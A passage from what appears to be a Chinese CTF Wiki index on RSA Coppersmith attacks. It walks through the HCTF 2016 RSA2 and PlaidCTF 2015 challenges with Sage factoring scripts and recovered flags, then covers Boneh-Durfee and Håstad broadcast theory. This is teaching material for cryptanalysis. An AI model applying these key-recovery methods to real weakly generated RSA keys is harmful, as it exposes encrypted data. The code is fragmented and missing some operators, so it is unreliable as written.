\ne\n \n=\n \ngen_key\n()\n\n    \nn\n \n=\n \np\n \n*\n \nq\n\n    \nphi_n\n \n=\n \n(\np\n-\n1\n)\n*\n(\nq\n-\n1\n)\n\n    \nd\n \n=\n \ninvmod\n(\ne\n,\n \nphi_n\n)\n\n    \nwhile\n \nTrue\n:\n\n        \ne2\n \n=\n \nrandom\n.\nrandint\n(\n0x1000\n,\n \n0x10000\n)\n\n        \nif\n \ngcd\n(\ne2\n,\n \nphi_n\n)\n \n==\n \n1\n:\n\n            \nbreak\n\n\n\n\n\n\u6211\u4eec\u5f97\u5230\u7684 \nn=p \\times q\nn=p \\times q\n\u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 \ngen_key\n \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b \ngen_key\n \u51fd\u6570\n\n\ndef\n \ngen_key\n():\n\n    \nwhile\n \nTrue\n:\n\n        \np\n \n=\n \ngetPrime\n(\nk\n/\n2\n)\n\n        \nif\n \ngcd\n(\ne\n,\n \np\n-\n1\n)\n \n==\n \n1\n:\n\n            \nbreak\n\n    \nq_t\n \n=\n \ngetPrime\n(\nk\n/\n2\n)\n\n    \nn_t\n \n=\n \np\n \n*\n \nq_t\n\n    \nt\n \n=\n \nget_bit\n(\nn_t\n,\n \nk\n/\n16\n,\n \n1\n)\n\n    \ny\n \n=\n \nget_bit\n(\nn_t\n,\n \n5\n*\nk\n/\n8\n,\n \n0\n)\n\n    \np4\n \n=\n \nget_bit\n(\np\n,\n \n5\n*\nk\n/\n16\n,\n \n1\n)\n\n    \nu\n \n=\n \npi_b\n(\np4\n,\n \n1\n)\n\n    \nn\n \n=\n \nbytes_to_long\n(\nlong_to_bytes\n(\nt\n)\n \n+\n \nlong_to_bytes\n(\nu\n)\n \n+\n \nlong_to_bytes\n(\ny\n))\n\n    \nq\n \n=\n \nn\n \n/\n \np\n\n    \nif\n \nq\n \n%\n \n2\n \n==\n \n0\n:\n\n        \nq\n \n+=\n \n1\n\n    \nwhile\n \nTrue\n:\n\n        \nif\n \nisPrime\n(\nq\n)\n \nand\n \ngcd\n(\ne\n,\n \nq\n-\n1\n)\n \n==\n \n1\n:\n\n            \nbreak\n\n        \nm\n \n=\n \ngetPrime\n(\nk\n/\n16\n)\n \n+\n \n1\n\n        \nq\n \n^=\n \nm\n\n    \nreturn\n \n(\np\n,\n \nq\n,\n \ne\n)\n\n\n\n\n\n\u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570\n\n\n\n\n\nk=2048\ne=0x10001\n\n\n\n\nk=2048\ne=0x10001\n\n\n\n\n\n\u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 \ngcd(2,p-1)=1\n\u3002\n\n\n\u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 \nq_t\nq_t\n\uff0c\u5e76\u4e14\u8ba1\u7b97 \nn_t=p \\times q_t\nn_t=p \\times q_t\n\u3002\n\n\n\u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 \nget_bit\n \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\n\n\ndef\n \nget_bit\n(\nnumber\n,\n \nn_bit\n,\n \ndire\n):\n\n    \n\n\n    dire:\n\n\n        1: left\n\n\n        0: right\n\n\n    \n\n\n    \nif\n \ndire\n:\n\n        \nsn\n \n=\n \nsize\n(\nnumber\n)\n\n        \nif\n \nsn\n \n%\n \n8\n \n!=\n \n0\n:\n\n            \nsn\n \n+=\n \n(\n8\n \n-\n \nsn\n \n%\n \n8\n)\n\n        \nreturn\n \nnumber\n \n \n(\nsn\n-\nn_bit\n)\n\n    \nelse\n:\n\n        \nreturn\n \nnumber\n \n \n(\npow\n(\n2\n,\n \nn_bit\n)\n \n-\n \n1\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6839\u636e \ndire(ction)\n \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570\n\n\n\n\ndire=1\n \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 \nnumber\n \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 \nsn\n\uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 \nsn\n \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de \nnumber\n \u53f3\u79fb \nsn-n_bit\n \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 \nnumber\n \u7684 \nn_bit\n \u4f4d\u3002\n\n\ndire=0\n \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 \nnumber\n \u7684\u4f4e \nn_bit\n \u4f4d\u3002\n\n\n\n\n\u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f\n\n\n    \nt\n \n=\n \nget_bit\n(\nn_t\n,\n \nk\n/\n16\n,\n \n1\n)\n\n    \ny\n \n=\n \nget_bit\n(\nn_t\n,\n \n5\n*\nk\n/\n8\n,\n \n0\n)\n\n    \np4\n \n=\n \nget_bit\n(\np\n,\n \n5\n*\nk\n/\n16\n,\n \n1\n)\n\n\n\n\n\n\u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5\n\n\n\n\nt\n \u4e3a \nn_t\n \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002\n\n\ny\n \u4e3a \nn_t\n \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002\n\n\np4\n \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002\n\n\n\n\n\u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c\n\n\n    \nu\n \n=\n \npi_b\n(\np4\n,\n \n1\n)\n\n\n\n\n\n\u5229\u7528 \npi_b\n \u5bf9 \np4\n \u8fdb\u884c\u4e86\u52a0\u5bc6\n\n\ndef\n \npi_b\n(\nx\n,\n \nm\n):\n\n    \n\n\n    m:\n\n\n        1: encrypt\n\n\n        0: decrypt\n\n\n    \n \n    \nenc\n \n=\n \nDES\n.\nnew\n(\nkey\n)\n\n    \nif\n \nm\n:\n\n        \nmethod\n \n=\n \nenc\n.\nencrypt\n\n    \nelse\n:\n\n        \nmethod\n \n=\n \nenc\n.\ndecrypt\n\n    \ns\n \n=\n \nlong_to_bytes\n(\nx\n)\n\n    \nsp\n \n=\n \n[\ns\n[\na\n:\na\n+\n8\n]\n \nfor\n \na\n \nin\n \nxrange\n(\n0\n,\n \nlen\n(\ns\n),\n \n8\n)]\n\n    \nr\n \n=\n \n\n    \nfor\n \na\n \nin\n \nsp\n:\n\n        \nr\n \n+=\n \nmethod\n(\na\n)\n\n    \nreturn\n \nbytes_to_long\n(\nr\n)\n\n\n\n\n\n\u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002\n\n\n\u4e0b\u9762\n\n\n    \nn\n \n=\n \nbytes_to_long\n(\nlong_to_bytes\n(\nt\n)\n \n+\n \nlong_to_bytes\n(\nu\n)\n \n+\n \nlong_to_bytes\n(\ny\n))\n\n    \nq\n \n=\n \nn\n \n/\n \np\n\n    \nif\n \nq\n \n%\n \n2\n \n==\n \n0\n:\n\n        \nq\n \n+=\n \n1\n\n    \nwhile\n \nTrue\n:\n\n        \nif\n \nisPrime\n(\nq\n)\n \nand\n \ngcd\n(\ne\n,\n \nq\n-\n1\n)\n \n==\n \n1\n:\n\n            \nbreak\n\n        \nm\n \n=\n \ngetPrime\n(\nk\n/\n16\n)\n \n+\n \n1\n\n        \nq\n \n^=\n \nm\n\n    \nreturn\n \n(\np\n,\n \nq\n,\n \ne\n)\n\n\n\n\n\n\u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de \nq'\n\u3002\n\n\n\u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 \nn'=p*q'\n\u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\n\n\nn\n=p * ( q + random(2^{k/16}))\n\n\n\n\n\u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 \nk/2+k/16=9k/16\nk/2+k/16=9k/16\n \u6bd4\u7279\u4f4d\u3002\n\n\n\u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002\n\n\n\u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b\n\n\nu=hex(n)[2:-1][-480:-320]\n\n\n\n\n\u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b\n\n\nif\n \n__name__\n==\n__main__\n:\n\n    \nn\n \n=\n \n0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\n\n    \nu\n \n=\n \nhex\n(\nn\n)[\n2\n:\n-\n1\n][\n-\n480\n:\n-\n320\n]\n\n    \nu\n \n=\n \nint\n(\nu\n,\n16\n)\n\n    \np4\n \n=\n \npi_b\n(\nu\n,\n0\n)\n\n    \nprint\n \nhex\n(\np4\n)\n\n\n\n\n\n\u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c\n  \n2016\n-\nHCTF\n-\nRSA2\n \ngit\n:(\nmaster\n)\n \n\u2717\n \npython\n \nexp_p4\n.\npy\n \n\n0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693\nL\n\n\n\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d\n\n\nfrom\n \nsage.all\n \nimport\n \n*\n\n\nimport\n \nbinascii\n\n\nn\n \n=\n \n0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\n\n\np4\n \n=\n0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693\n\n\ncipher\n \n=\n \n0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\n\n\ne2\n \n=\n \n0xf93b\n\n\npbits\n \n=\n \n1024\n\n\nkbits\n \n=\n \npbits\n \n-\n \np4\n.\nnbits\n()\n\n\nprint\n \np4\n.\nnbits\n()\n\n\np4\n \n=\n \np4\n \n \nkbits\n\n\nPR\n.\nx\n \n=\n \nPolynomialRing\n(\nZmod\n(\nn\n))\n\n\nf\n \n=\n \nx\n \n+\n \np4\n\n\nroots\n \n=\n \nf\n.\nsmall_roots\n(\nX\n=\n2\n^\nkbits\n,\n \nbeta\n=\n0.4\n)\n\n\nif\n \nroots\n:\n\n    \np\n \n=\n \np4\n+\nint\n(\nroots\n[\n0\n])\n\n    \nprint\n \np: \n,\n \nhex\n(\nint\n(\np\n))\n\n    \nassert\n \nn\n \n%\n \np\n \n==\n \n0\n\n    \nq\n \n=\n \nn\n/\nint\n(\np\n)\n\n    \nprint\n \nq: \n,\n \nhex\n(\nint\n(\nq\n))\n\n    \nprint\n \ngcd\n(\np\n,\nq\n)\n\n    \nphin\n \n=\n \n(\np\n-\n1\n)\n*\n(\nq\n-\n1\n)\n\n    \nprint\n \ngcd\n(\ne2\n,\nphin\n)\n\n    \nd\n \n=\n \ninverse_mod\n(\ne2\n,\nphin\n)\n\n    \nflag\n \n=\n \npow\n(\ncipher\n,\nd\n,\nn\n)\n\n    \nflag\n \n=\n \nhex\n(\nint\n(\nflag\n))[\n2\n:\n-\n1\n]\n\n    \nprint\n \nbinascii\n.\nunhexlify\n(\nflag\n)\n\n\n\n\n\n\u5173\u4e8e \nsmall_roots\n \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 \nSAGE \u8bf4\u660e\n\u3002\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  \n2016\n-HCTF-RSA2 git:\n(\nmaster\n)\n \u2717 sage payload.sage\nsys:1: RuntimeWarning: not adding directory \n to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might \nthen\n be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\n\n640\n\np:  0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L\nq:  0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L\n\n1\n\n\n1\n\nhctf\n{\nd8e8fca2dc0f896fd7cb4cb0031ba249\n}\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\n2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA\n\n\n2017 WHCTF Untitled\n\n\n\n\nBoneh and Durfee attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 \nd\\leq N^{0.292}\nd\\leq N^{0.292}\n \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u5de5\u5177\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u8be5\u8981\u653b\u51fb\u6bd4 Wiener's Attack\u8981\u5f3a\u4e00\u4e9b\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406\n\n\n\u9996\u5148\u6211\u4eec\u6709\n\n\n\n\n\ned \\equiv 1 \\bmod  \\varphi(N)\n\n\n\n\ned \\equiv 1 \\bmod  \\varphi(N)\n\n\n\n\n\n\u8fdb\u800c\u6211\u4eec\u6709\n\n\n\n\n\ned =k\\varphi(N)+1\n\n\n\n\ned =k\\varphi(N)+1\n\n\n\n\n\n\u5373\n\n\n\n\n\nk \\varphi(N) +1 \\equiv 0 \\bmod e\n\n\n\n\nk \\varphi(N) +1 \\equiv 0 \\bmod e\n\n\n\n\n\n\u53c8\n\n\n\n\n\n\\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1\n\n\n\n\n\\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\nk(N-p-q+1)+1 \\equiv 0 \\bmod e\n\n\n\n\nk(N-p-q+1)+1 \\equiv 0 \\bmod e\n\n\n\n\n\n\u6211\u4eec\u5047\u8bbe \nA=N+1\nA=N+1\n\uff0c\ny=-p-q\ny=-p-q\n \u90a3\u4e48\n\n\n\u539f\u5f0f\u53ef\u5316\u4e3a\n\n\n\n\n\nf(k,y)=k(A+y)+1 \\equiv 0 \\bmod e\n\n\n\n\nf(k,y)=k(A+y)+1 \\equiv 0 \\bmod e\n\n\n\n\n\n\u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b \nN=pq,p+q=-y\nN=pq,p+q=-y\n \u6765\u5f97\u5230 p \u4e0e q\u3002\n\n\n\u653b\u51fb\u5de5\u5177\n\n\n\u8bf7\u53c2\u8003 \nhttps://github.com/mimoo/RSA-and-LLL-attacks\n\u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF-CTF-Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002\n\n\n\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b\n\n\n    \nnlist\n \n=\n \nlist\n()\n\n    \nelist\n \n=\n \nlist\n()\n\n    \nclist\n \n=\n \nlist\n()\n\n    \nwith\n \nopen\n(\ncaptured\n)\n \nas\n \nf\n:\n\n        \n# read the line {N : e : c} and do nothing with it\n\n        \nf\n.\nreadline\n()\n\n        \nfor\n \ni\n \nin\n \nf\n.\nreadlines\n():\n\n            \n(\nN\n,\n \ne\n,\n \nc\n)\n \n=\n \ni\n[\n1\n:\n-\n2\n]\n.\nsplit\n(\n : \n)\n\n            \nnlist\n.\nappend\n(\nlong\n(\nN\n,\n16\n))\n\n            \nelist\n.\nappend\n(\nlong\n(\ne\n,\n16\n))\n\n            \nclist\n.\nappend\n(\nlong\n(\nc\n,\n16\n))\n\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\nnlist\n)):\n\n        \nprint\n \nindex i\n\n        \nn\n \n=\n \nnlist\n[\ni\n]\n\n        \ne\n \n=\n \nelist\n[\ni\n]\n\n        \nc\n \n=\n \nclist\n[\ni\n]\n\n        \nd\n \n=\n \nsolve\n(\nn\n,\ne\n)\n\n        \nif\n \nd\n==\n0\n:\n\n            \ncontinue\n\n        \nelse\n:\n\n            \nm\n \n=\n \npower_mod\n(\nc\n,\n \nd\n,\n \nn\n)\n\n            \nhex_string\n \n=\n \n%x\n \n%\n \nm\n\n            \nimport\n \nbinascii\n\n            \nprint\n \nthe plaintext:\n,\n \nbinascii\n.\nunhexlify\n(\nhex_string\n)\n\n            \nreturn\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n===\n solution \nfound\n \n===\n\nprivate key found: \n23974584842546960047080386914966001070087596246662608796022581200084145416583\n\nthe plaintext: flag_S0Y0UKN0WW13N3R\n$4\nTT4CK!", 
            "title": "Coppersmith \u76f8\u5173\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmith", 
            "text": "", 
            "title": "Coppersmith \u76f8\u5173\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u6765\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b  Coppersmith method  \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7531  Don Coppersmith  \u63d0\u51fa\uff0c\u53ef\u4ee5\u7528\u6765\u627e\u5230\u5355\u53d8\u91cf\u6216\u8005\u4e8c\u5143\u53d8\u91cf\u7684\u591a\u9879\u5f0f\u5728\u6a21\u67d0\u4e2a\u6574\u6570\u4e0b\u7684\u6839\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\uff0c\u5047\u8bbe\u6211\u4eec\u6709\u5982\u4e0b\u7684\u4e00\u4e2a\u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u591a\u9879\u5f0f F   \nF(x)=x^n + a_{n-1} x^{n-1} + \\cdots + a_1x + a_0  \nF(x)=x^n + a_{n-1} x^{n-1} + \\cdots + a_1x + a_0   \u5047\u8bbe\u8be5\u591a\u9879\u5f0f\u5728\u6a21 N \u610f\u4e49\u4e0b\u6709\u4e00\u4e2a\u6839  x_0 x_0 \uff0c\u8fd9\u91cc\u6211\u4eec\u4ee4  x_0   M^{\\frac{1}{n}} x_0 < M^{\\frac{1}{n}} \u3002\u5982\u679c\u7b49\u53f7\u6210\u7acb\u7684\u8bdd\uff0c\u663e\u7136\u53ea\u6709  x^n x^n  \u8fd9\u4e00\u9879\uff0c\u90a3 0 \u5c31\u662f\uff0c\u4e5f\u6ee1\u8db3\u3002  Coppersmith method  \u4e3b\u8981\u662f\u901a\u8fc7  Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm \uff08LLL\uff09\u65b9\u6cd5\u6765\u627e\u5230\u4e0e\u8be5\u51fd\u6570\u5177\u6709\u76f8\u540c\u6839  x_0 x_0  \u4f46\u6709\u66f4\u5c0f\u7cfb\u6570\u7684\u591a\u9879\u5f0f\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#basic-broadcast-attack", 
            "text": "", 
            "title": "Basic Broadcast Attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_2", 
            "text": "\u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_3", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570  n_1,n_2,n_3 n_1,n_2,n_3  \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b   \n\\begin{align*}\nc_1 =m^3\\bmod n_1 \\\\\nc_2 =m^3\\bmod n_2 \\\\\nc_3 =m^3\\bmod n_3\n\\end{align*}  \n\\begin{align*}\nc_1&=m^3\\bmod n_1 \\\\\nc_2&=m^3\\bmod n_2 \\\\\nc_3&=m^3\\bmod n_3\n\\end{align*}   \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe  n_1,n_2,n_3\u200b n_1,n_2,n_3\u200b  \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002  \u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe  m n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002  \u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97 m^3 \\equiv C \\bmod n_1n_2n_3 m^3 \\equiv C \\bmod n_1n_2n_3 \u3002  